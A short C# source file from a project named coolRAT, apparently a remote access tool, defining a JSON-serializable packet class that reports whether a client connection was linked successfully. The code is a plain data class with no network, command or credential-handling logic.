using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Libs.Packets
{
    public class CAP_ConnectionLinkedPacket : Packet
    {
        public bool Success;
        public CAP_ConnectionLinkedPacket(Guid clientId, bool success) : base(clientId)
        {
            Success = success;
            Type = "CAP_ConnectionLinkedPacket";
        }

        public new string Serialize()
        {
            return JsonConvert.SerializeObject(this);
        }

        public new static CAP_ConnectionLinkedPacket Deserialize(string packet_string)
        {
            return JsonConvert.DeserializeObject<CAP_ConnectionLinkedPacket>(packet_string);
        }
    }
}
